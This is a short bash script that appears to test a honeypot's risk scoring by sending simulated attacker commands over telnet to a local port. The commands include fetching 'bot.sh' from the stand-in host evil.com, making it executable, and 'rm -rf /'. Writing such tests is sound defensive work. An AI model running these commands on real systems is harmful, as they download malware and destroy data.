#!/bin/bash

echo "Testing high-risk command scoring..."

(
  echo "wget http://evil.com/bot.sh"
  sleep 1
  echo "chmod +x bot.sh"
  sleep 1
  echo "rm -rf /"
  sleep 1
) | telnet localhost 2323 >/dev/null 2>&1

echo "High-risk attack simulated."
